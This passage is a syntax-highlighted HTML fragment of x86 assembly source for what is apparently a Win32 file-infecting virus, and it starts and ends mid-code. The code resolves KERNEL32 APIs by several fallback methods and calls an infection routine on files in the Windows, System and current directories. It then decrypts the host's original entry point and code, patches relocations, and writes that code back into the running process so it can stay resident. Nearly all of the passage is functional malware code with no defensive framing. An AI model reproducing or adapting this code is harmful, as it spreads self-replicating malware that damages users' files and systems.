        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc12">'W'</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">d_updt</span><span class="sc0">
</span><span class="sc5">d_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc12">'eliF'</span><span class="sc0">     </span><span class="sc1">;expand to 'File' where aplies</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">d_stor</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">d_loop</span><span class="sc0">
</span><span class="sc5">d_updt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">d_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_stringz</span><span class="sc0"> </span><span class="sc1">;get next character</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyGetModuleHandleA</span><span class="sc0">      </span><span class="sc1">;get KERNEL32 base adress (first try)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gotK32</span><span class="sc0">                  </span><span class="sc1">;jump if found</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">copy_K32W</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;make unicode string for KERNEL32</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">copy_K32W</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyGetModuleHandleW</span><span class="sc0">      </span><span class="sc1">;get KERNEL32 base adress (second try)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gotK32</span><span class="sc0">                  </span><span class="sc1">;jump if found</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyGetModuleHandleX</span><span class="sc0">      </span><span class="sc1">;get KERNEL32 base adress (third try)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gotK32</span><span class="sc0">                  </span><span class="sc1">;jump if found</span><span class="sc0">

</span><span class="sc5">quit_app</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;shit.. KERNEL32 base adress not found</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;try to quit aplication via an undocumented way</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">67h</span><span class="sc0">                             </span><span class="sc1">;some prefix to confuse lamerz</span><span class="sc0">
</span><span class="sc5">seh_fn</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.EH_EstablisherFrame</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">cPushad</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tmp_edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;remove SEH frame</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">seh_rs</span><span class="sc0">

</span><span class="sc5">gotK32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Mod</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;store KERNEL32 base adress</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">find_APIs</span><span class="sc0">               </span><span class="sc1">;got RVA pointer to GetProcAdress API?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyGetProcAddressK32</span><span class="sc0">     </span><span class="sc1">;no, get adress of GetProcAdress directly</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">find_APIs</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">find_APIs</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;find file related API adressez from KERNEL32..</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FunctionNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FunctionAdressez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">GetAPIAddress</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyGetProcAddressK32</span><span class="sc0">     </span><span class="sc1">;get API adress</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">quit_app</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;save retrieved API adress</span><span class="sc0">
        </span><span class="sc5">@endsz</span><span class="sc0">                          </span><span class="sc1">;point to next API name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">;end of API namez reached?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetAPIAddress</span><span class="sc0">           </span><span class="sc1">;no, get next API adress</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Process_Dir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;infect filez in WINDOWS directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetSystemDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;infect filez in SYSTEM directory</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;infect filez in current directory</span><span class="sc0">

</span><span class="sc5">build_host</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;rebuild the host..</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pCodeTable</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get code table of host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get host base adress</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0B2FD26A3h</span><span class="sc0">          </span><span class="sc1">;decrypt original entry point RVA</span><span class="sc0">
</span><span class="sc5">add_1st_val</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;save entry point for l8r retrieval</span><span class="sc0">

</span><span class="sc5">get_count</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetCurrentProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get pseudo-handle for current process</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">;get number of bytes to copy</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;push parameterz to WriteProcessMemory API</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">decrypt_hostcode</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;decrypt the chunk of original host code previosly encrypted..</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06Ah</span><span class="sc0">
</span><span class="sc5">xor_2nd_val</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_hostcode</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">old_base</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;has host base adress been relocated?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">write_chunk</span><span class="sc0">     </span><span class="sc1">;no, relocation fix not necesary.. jump</span><span class="sc0">

        </span><span class="sc1">;fix code pointed to by one or more nulified relocationz..</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">                          </span><span class="sc1">;get RVA start of relocation section..</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">      \ </span><span class="sc1">;get size of relocation dir.</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">    \
                        </span><span class="sc5">.DE_BaseReloc</span><span class="sc0">           \
                        </span><span class="sc5">.DD_Size</span><span class="sc0">                \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">_popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">      \ </span><span class="sc1">;get RVA to relocation section</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">    \
                        </span><span class="sc5">.DE_BaseReloc</span><span class="sc0">           \
                        </span><span class="sc5">.DD_VirtualAddress</span><span class="sc0">      \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">redo_reloc</span><span class="sc0">      </span><span class="sc1">;pass adress of fix_relocs label as a parameter</span><span class="sc0">

</span><span class="sc5">fix_relocs</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;process relocation block and look for nulified relocationz..</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">;get relocation item</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc10">sign?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">f_next_reloc</span><span class="sc0">                    </span><span class="sc1">;if first item, jump to get next relocation item</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">RD_RelocType</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">;is relocation nulified?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">f_next_reloc</span><span class="sc0">                    </span><span class="sc1">;no, jump to get next relocation item</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;relocation item points inside chunk of code?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">f_next_reloc</span><span class="sc0">                    </span><span class="sc1">;no, jump to get next relocation item</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">f_next_reloc</span><span class="sc0">                    </span><span class="sc1">;no, jump to get next relocation item</span><span class="sc0">

        </span><span class="sc1">;relocation item is pointing inside chunk of code.. add delta to fix it..</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Pushad_ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get actual host base adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">cPushad</span><span class="sc4">)</span><span class="sc5">.Arg3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get pointer to chunk of code inside code table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Pushad_ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get relocation delta to add</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;add delta.. (aack! damned relocationz..)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">f_next_reloc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fix_relocs</span><span class="sc0">              </span><span class="sc1">;get next relocation item</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">redo_reloc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_relocs</span><span class="sc0">
</span><span class="sc5">_popad</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">write_chunk</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddWriteProcessMemory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;write chunk of code to the code section</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">n_host</span><span class="sc0">          </span><span class="sc1">;if error, jump and try to stay resident without jumpin back to host</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">;get pointer to next chunk of code to patch, if any</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">n_host</span><span class="sc0">          </span><span class="sc1">;if error, jump and try to stay resident without jumpin back to host</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">
